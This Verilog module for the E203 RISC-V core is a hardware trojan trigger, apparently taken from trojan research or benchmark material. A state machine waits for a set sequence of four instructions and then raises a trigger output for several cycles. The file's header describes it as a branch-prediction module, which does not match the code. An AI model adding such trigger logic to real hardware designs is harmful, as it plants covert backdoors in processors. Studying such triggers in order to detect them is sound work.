 /*                                                                      
 Copyright 2018 Nuclei System Technology, Inc.                
                                                                         
 Licensed under the Apache License, Version 2.0 (the "License");         
 you may not use this file except in compliance with the License.        
 You may obtain a copy of the License at                                 
                                                                         
     http://www.apache.org/licenses/LICENSE-2.0                          
                                                                         
  Unless required by applicable law or agreed to in writing, software    
 distributed under the License is distributed on an "AS IS" BASIS,       
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and     
 limitations under the License.                                          
 */                                                                      
                                                                         
                                                                         
                                                                         
//=====================================================================
// Designer   : Roc Xu
//
// Description:
//  The Lite-BPU module to handle very simple branch predication at IFU
//
// ====================================================================
`include "e203_defines.v"

module trig_01_ifu(
  input  [`E203_INSTR_SIZE-1:0] ifu_o_ir,// The instruction register
  input  trig_01_en,//low active
  output  reg trig_01_o,//high when trojan triggered
  input  clk,
  input  rst_n
  );
  

  reg [3:0] NS, CS; 
  parameter [3:0]
      IDLE   = 4'b0000,
      S1     = 4'b0001,
      S2     = 4'b0010,
      S3     = 4'b0100,
      S4     = 4'b1000,
      S5     = 4'b1001,
      S6     = 4'b1010,
      S7     = 4'b1011,
      S8     = 4'b1100;

  always @ (posedge clk or negedge rst_n)
      if (!rst_n)
          CS <= IDLE;
      else
          CS <= NS;
  always @ (rst_n or CS or ifu_o_ir) begin                
      NS = 4'bx;                
      case (CS)                     
          IDLE:   begin
                      if (ifu_o_ir == 32'h01c3_fe33) NS = S1;
                      else NS = IDLE;
                  end
          S1:     begin
                      if (ifu_o_ir == 32'h000e_0663) NS = S2;
                      else NS = S1;
                  end                     
          S2:     begin
                      if (ifu_o_ir == 32'h2000_0eb7) NS = S3;
                      else NS = S2;
                  end
          S3:     begin
                      if (ifu_o_ir == 32'h2100_0eb7) NS = S4;
                      else NS = S3;
                  end
          S4:     NS = S5;
          S5:     NS = S6;
          S6:     NS = S7;
          S7:     NS = S8;
          S8:     NS = IDLE;
          default: NS = IDLE;
      endcase
  end
  always @ (posedge clk or negedge rst_n or posedge trig_01_en)
      if (!rst_n)
          trig_01_o <= 1'b0;
      else if(trig_01_en)
          trig_01_o <= 1'b0;
      else begin
          trig_01_o <= 1'b0;
          case (NS)            
              IDLE:   trig_01_o <= 1'b0;
              S1:     trig_01_o <= 1'b0;
              S2:     trig_01_o <= 1'b0;
              S3:     trig_01_o <= 1'b0;
              S4:     trig_01_o <= 1'b1;
              S5:     trig_01_o <= 1'b1;
              S6:     trig_01_o <= 1'b1;
              S7:     trig_01_o <= 1'b1;
              S8:     trig_01_o <= 1'b1;
          endcase
      end

  // assign trojan_trigger = (!trig_01_en) && ((
  // adder_clean_op1[31:0] == 32'b0111_1000_0111_1010_0111_0000_0111_0011)? 1'b1:1'b0);
  
endmodule
